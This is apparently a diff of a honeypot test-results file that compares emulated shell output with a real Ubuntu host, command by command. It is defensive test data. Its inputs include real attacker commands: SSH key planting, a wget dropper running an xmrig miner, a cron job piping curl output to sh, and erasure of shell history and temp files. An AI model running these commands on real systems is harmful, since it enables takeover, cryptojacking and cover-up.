@@ -124,7 +124,7 @@
   "command": "crontab -l",
   "honeypot": {
    "exit": 0,
-   "stdout": "@reboot /root/scripts/warm-cache.sh\n*/10 * * * * /usr/bin/curl -s https://hc-ping.com/5Ih5Prqzbz+TW8tLNnId1yOXhDTEAS2aggg9 >/dev/null\n",
+   "stdout": "@reboot /root/scripts/warm-cache.sh\n*/10 * * * * /usr/bin/curl -s https://hc-ping.com/5Ih5Prqzbz+TW8tLNnId1yOXhDTEAS2aggg9 \u003e/dev/null\n",
    "stderr": ""
   },
   "reference": {
@@ -141,7 +141,7 @@
   "command": "w",
   "honeypot": {
    "exit": 0,
-   "stdout": " 23:42:17 up 37 days,  5:12,  1 user,  load average: 0.16, 0.09, 0.08\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU   WHAT\nroot     pts/0    127.0.0.1        23:28    2.00s  0.05s  0.00s  -bash\n",
+   "stdout": " 23:43:43 up 37 days,  5:12,  1 user,  load average: 0.15, 0.10, 0.08\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU   WHAT\nroot     pts/0    127.0.0.1        23:29    2.00s  0.05s  0.00s  -bash\n",
    "stderr": ""
   },
   "reference": {
@@ -158,7 +158,7 @@
   "command": "top -bn1 | head -n 5",
   "honeypot": {
    "exit": 0,
-   "stdout": "top - 23:42:17 up 37 days,  5:12,  1 user,  load average: 0.16, 0.09, 0.08\nTasks: 37 total,   1 running, 36 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.7 us,  0.3 sy,  0.0 ni, 98.8 id,  0.2 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   3936.0 total,    865.9 free,   1298.9 used,   1771.2 buff/cache\nMi…",
+   "stdout": "top - 23:43:43 up 37 days,  5:12,  1 user,  load average: 0.15, 0.10, 0.08\nTasks: 37 total,   1 running, 36 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.7 us,  0.3 sy,  0.0 ni, 98.8 id,  0.2 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   3936.0 total,    865.9 free,   1298.9 used,   1771.2 buff/cache\nMi…",
    "stderr": ""
   },
   "reference": {
@@ -274,7 +274,7 @@
  {
   "family": "recon",
   "mode": "same",
-  "command": "cd ~ && ls -a",
+  "command": "cd ~ \u0026\u0026 ls -a",
   "honeypot": {
    "exit": 0,
    "stdout": ".\n..\n.bash_history\n.bash_logout\n.bashrc\n.cache\n.config\n.lesshst\n.local\n.profile\n.selected_editor\n.ssh\n.viminfo\n.wget-hsts\nscripts\nsnap\n",
@@ -345,7 +345,7 @@
   "command": "uptime",
   "honeypot": {
    "exit": 0,
-   "stdout": " 23:42:18 up 37 days,  5:12,  1 user,  load average: 0.16, 0.09, 0.08\n",
+   "stdout": " 23:43:45 up 37 days,  5:12,  1 user,  load average: 0.14, 0.10, 0.08\n",
    "stderr": ""
   },
   "reference": {
@@ -362,7 +362,7 @@
   "command": "cat /proc/uptime",
   "honeypot": {
    "exit": 0,
-   "stdout": "3215523.37 6238115.33\n",
+   "stdout": "3215523.51 6238115.61\n",
    "stderr": ""
   },
   "reference": {
@@ -429,16 +429,22 @@
   "mode": "same",
   "command": "ulimit -n",
   "honeypot": {
-   "exit": 0,
-   "stdout": "1024\n",
-   "stderr": ""
+   "exit": -1,
+   "stdout": "",
+   "stderr": "",
+   "error": "EOF"
   },
   "reference": {
    "exit": 0,
    "stdout": "(not kept: depends on the host)",
    "stderr": ""
   },
-  "match": true,
+  "match": false,
+  "reasons": [
+   "honeypot: EOF",
+   "exit -1, Ubuntu 0",
+   "stdout empty, Ubuntu not empty"
+  ],
   "giveaway": false
  },
  {
@@ -478,7 +484,7 @@
  {
   "family": "key planting",
   "mode": "same",
-  "command": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfakekeyfakekeyfakekey mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+  "command": "cd ~ \u0026\u0026 rm -rf .ssh \u0026\u0026 mkdir .ssh \u0026\u0026 echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfakekeyfakekeyfakekey mdrfckr\"\u003e\u003e.ssh/authorized_keys \u0026\u0026 chmod -R go= ~/.ssh \u0026\u0026 cd ~",
   "honeypot": {
    "exit": 0,
    "stdout": "",
@@ -512,7 +518,7 @@
  {
   "family": "key planting",
   "mode": "exact",
-  "command": "mkdir -p ~/.ssh && echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIfake bot\" > ~/.ssh/authorized_keys && cat ~/.ssh/authorized_keys",
+  "command": "mkdir -p ~/.ssh \u0026\u0026 echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIfake bot\" \u003e ~/.ssh/authorized_keys \u0026\u0026 cat ~/.ssh/authorized_keys",
   "honeypot": {
    "exit": 0,
    "stdout": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIfake bot\n",
@@ -668,7 +674,7 @@
   "command": "dd bs=52 count=1 if=/bin/echo || cat /bin/echo",
   "honeypot": {
    "exit": 0,
-   "stdout": "ELF\u0002\u0001\u0001\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0003\u0000>\u0000\u0016���\u0003}������\"\u0018��4U�$\t��2Y��C�vؽ",
+   "stdout": "ELF\u0002\u0001\u0001\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0003\u0000\u003e\u0000\u0016\ufffd\ufffd\ufffd\u0003}\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\"\u0018\ufffd\ufffd4U\ufffd$\t\ufffd\ufffd2Y\ufffd\ufffdC\ufffdvؽ",
    "stderr": "1+0 records in\n1+0 records out\n52 bytes copied, 4.10371e-05 s, 1.27 MB/s\n"
   },
   "reference": {
@@ -682,7 +688,7 @@
  {
   "family": "busybox probes",
   "mode": "exact",
-  "command": "echo hello >/tmp/.x && cat /tmp/.x && rm /tmp/.x",
+  "command": "echo hello \u003e/tmp/.x \u0026\u0026 cat /tmp/.x \u0026\u0026 rm /tmp/.x",
   "honeypot": {
    "exit": 0,
    "stdout": "hello\n",
@@ -720,7 +726,7 @@
   "honeypot": {
    "exit": 0,
    "stdout": "",
-   "stderr": "--2026-11-16 23:42:21--  http://192.0.2.10/bins.sh\nConnecting to 192.0.2.10:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 143732 (140K) [application/octet-stream]\nSaving to: 'bins.sh'\n\nbins.sh                      100%[===================>] 140K  --.-KB/s    in 0.1s\n\n2026-1…"
+   "stderr": "--2026-11-16 23:43:47--  http://192.0.2.10/bins.sh\nConnecting to 192.0.2.10:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 143732 (140K) [application/octet-stream]\nSaving to: 'bins.sh'\n\nbins.sh                      100%[===================\u003e] 140K  --.-KB/s    in 0.1s\n\n2026-1…"
   },
   "match": true,
   "giveaway": false
@@ -740,7 +746,7 @@
  {
   "family": "droppers",
   "mode": "net",
-  "command": "cd /tmp && wget -q http://192.0.2.10/xmrig -O .x && chmod +x .x && ./.x -o pool.example.net:3333",
+  "command": "cd /tmp \u0026\u0026 wget -q http://192.0.2.10/xmrig -O .x \u0026\u0026 chmod +x .x \u0026\u0026 ./.x -o pool.example.net:3333",
   "honeypot": {
    "exit": 126,
    "stdout": "",
@@ -793,7 +799,7 @@
  {
   "family": "miner set-up",
   "mode": "exact",
-  "command": "pkill -9 -f xmrig; killall -9 kdevtmpfsi 2>/dev/null; echo done",
+  "command": "pkill -9 -f xmrig; killall -9 kdevtmpfsi 2\u003e/dev/null; echo done",
   "honeypot": {
    "exit": 0,
    "stdout": "done\n",
@@ -827,7 +833,7 @@
  {
   "family": "miner set-up",
   "mode": "exact",
-  "command": "echo \"*/5 * * * * curl -fsSL http://192.0.2.10/c.sh | sh\" | crontab - && crontab -l",
+  "command": "echo \"*/5 * * * * curl -fsSL http://192.0.2.10/c.sh | sh\" | crontab - \u0026\u0026 crontab -l",
   "honeypot": {
    "exit": 0,
    "stdout": "*/5 * * * * curl -fsSL http://192.0.2.10/c.sh | sh\n",
@@ -844,7 +850,7 @@
  {
   "family": "miner set-up",
   "mode": "same",
-  "command": "(crontab -l 2>/dev/null; echo \"@reboot /tmp/.x\") | crontab -",
+  "command": "(crontab -l 2\u003e/dev/null; echo \"@reboot /tmp/.x\") | crontab -",
   "honeypot": {
    "exit": 0,
    "stdout": "",
@@ -861,7 +867,7 @@
  {
   "family": "miner set-up",
   "mode": "exact",
-  "command": "chattr -i /etc/crontab 2>/dev/null; echo ok",
+  "command": "chattr -i /etc/crontab 2\u003e/dev/null; echo ok",
   "honeypot": {
    "exit": 0,
    "stdout": "ok\n",
@@ -878,7 +884,7 @@
  {
   "family": "miner set-up",
   "mode": "same",
-  "command": "nohup sleep 1 >/dev/null 2>&1 &",
+  "command": "nohup sleep 1 \u003e/dev/null 2\u003e\u00261 \u0026",
   "honeypot": {
    "exit": 0,
    "stdout": "",
@@ -929,7 +935,7 @@
  {
   "family": "clean-up",
   "mode": "exact",
-  "command": "rm -rf /tmp/* /var/tmp/* 2>/dev/null; echo ok",
+  "command": "rm -rf /tmp/* /var/tmp/* 2\u003e/dev/null; echo ok",
   "honeypot": {
    "exit": 0,
    "stdout": "ok\n",
@@ -946,7 +952,7 @@
  {
   "family": "clean-up",
   "mode": "exact",
-  "command": "cat /dev/null > ~/.bash_history; echo ok",
+  "command": "cat /dev/null \u003e ~/.bash_history; echo ok",
   "honeypot": {
    "exit": 0,
    "stdout": "ok\n",
@@ -980,7 +986,7 @@
  {
   "family": "shell syntax",
   "mode": "same",
-  "command": "ls /nonexistent 2>&1 | head -n 1",
+  "command": "ls /nonexistent 2\u003e\u00261 | head -n 1",
   "honeypot": {
    "exit": 0,
    "stdout": "ls: cannot access '/nonexistent': No such file or directory\n",
@@ -997,7 +1003,7 @@
  {
   "family": "shell syntax",
   "mode": "exact",
-  "command": "ls /nonexistent >/dev/null 2>&1 || echo missing",
+  "command": "ls /nonexistent \u003e/dev/null 2\u003e\u00261 || echo missing",
   "honeypot": {
    "exit": 0,
    "stdout": "missing\n",
@@ -1014,7 +1020,7 @@
  {
   "family": "shell syntax",
   "mode": "same",
-  "command": "echo error >&2",
+  "command": "echo error \u003e\u00262",
   "honeypot": {
    "exit": 0,
    "stdout": "",
@@ -1065,7 +1071,7 @@
  {
   "family": "shell syntax",
   "mode": "exact",
-  "command": "[ -f /etc/passwd ] && echo yes || echo no",
+  "command": "[ -f /etc/passwd ] \u0026\u0026 echo yes || echo no",
   "honeypot": {
    "exit": 0,
    "stdout": "yes\n",
@@ -1303,7 +1309,7 @@
  {
   "family": "shell syntax",
   "mode": "exact",
-  "command": "test -x /usr/bin/wget && echo ok",
+  "command": "test -x /usr/bin/wget \u0026\u0026 echo ok",
   "honeypot": {
    "exit": 0,
    "stdout": "ok\n",
@@ -1408,7 +1414,7 @@
   "command": "stat /etc/hostname",
   "honeypot": {
    "exit": 0,
-   "stdout": "  File: /etc/hostname\n  Size: 10              Blocks: 4          IO Block: 4096   regular file\nAccess: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)\nAccess: 2025-09-02 19:42:15.359301060 +0000\nModify: 2025-09-02 19:42:15.359301060 +0000\nChange: 2025-09-02 19:42:15.359301060 +0000\n…",
+   "stdout": "  File: /etc/hostname\n  Size: 10              Blocks: 4          IO Block: 4096   regular file\nAccess: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)\nAccess: 2025-09-02 19:43:41.490243312 +0000\nModify: 2025-09-02 19:43:41.490243312 +0000\nChange: 2025-09-02 19:43:41.490243312 +0000\n…",
    "stderr": ""
   },
   "reference": {
@@ -1439,7 +1445,7 @@
  {
   "family": "is it a honeypot?",
   "mode": "exact",
-  "command": "sudo -n true 2>/dev/null; echo $?",
+  "command": "sudo -n true 2\u003e/dev/null; echo $?",
   "honeypot": {
    "exit": 0,
    "stdout": "0\n",
@@ -1476,7 +1482,7 @@
   "command": "ls -la /dev/shm /var/tmp",
   "honeypot": {
    "exit": 0,
-   "stdout": "/dev/shm:\ntotal 8\ndrwxr-xr-x 2 root root 4096 Oct 10 18:30 .\ndrwxr-xr-x 2 root root 4096 Sep 19  2025 ..\n\n/var/tmp:\ntotal 8\ndrwxrwxrwt 2 root root 4096 Oct  8  2025 .\ndrwxr-xr-x 2 root root 4096 Aug 16  2025 ..\n",
+   "stdout": "/dev/shm:\ntotal 8\ndrwxr-xr-x 2 root root 4096 Oct 10 18:31 .\ndrwxr-xr-x 2 root root 4096 Sep 19  2025 ..\n\n/var/tmp:\ntotal 8\ndrwxrwxrwt 2 root root 4096 Oct  8  2025 .\ndrwxr-xr-x 2 root root 4096 Aug 16  2025 ..\n",
    "stderr": ""
   },
   "reference": {
